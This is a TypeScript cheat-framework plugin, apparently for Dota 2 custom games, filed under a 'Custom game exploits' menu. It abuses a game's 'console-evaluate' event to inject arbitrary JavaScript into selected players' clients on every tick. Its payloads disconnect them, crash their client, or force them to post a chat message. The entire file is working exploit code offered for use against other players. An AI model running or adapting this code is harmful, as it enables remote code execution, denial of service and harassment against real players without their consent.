import { EventsSDK, Menu, ArrayExtensions, EntityManager, Player } from "wrapper/Imports"
let root = Menu.AddEntry(["Utility", "Custom game exploits", "AABS"])
let payload_type = root.AddSwitcher("Payload type", ["None", "Disconnect", "Crash", "MASSONS"])
let players = root.AddImageSelector("Players", [])

function SendCode(code: string) {
	GameEvents.FireEventToAllClients("console-evaluate", {
		code,
	})
}
function SendCodeFiltered(code: string) {
	SendCode(`if(${JSON.stringify(players.values)}[Players.GetLocalPlayer()])${code}`)
}

EventsSDK.on("GameStarted", () => {
	// loop-optimizer: KEEP
	players.enabled_values.clear() // reset state every game, as it's based on playerIDs
})
EventsSDK.on("GameEnded", () => {
	players.values = []
})

EventsSDK.on("Tick", () => {
	// loop-optimizer: KEEP
	players.values = ArrayExtensions.orderBy(
		EntityManager.GetEntitiesByClass(Player).filter(p => p.Hero !== undefined),
		p => p.PlayerID
	).map(a => a.Hero!.Name)
	players.Update()
	if (players.values.length === 0)
		return
	switch (payload_type.selected_id) {
		case 1:
			SendCodeFiltered(`Game.ServerCmd("disconnect")`)
			break
		case 2:
			SendCodeFiltered(`[1].map(GameEvents.Subscribe)`)
			break
		case 3:
			SendCodeFiltered(`Game.ServerCmd("say МАССОНЫ ЗАХВАТЯТ ЭТОТ МИР")`)
			break
		default:
			break
	}
})
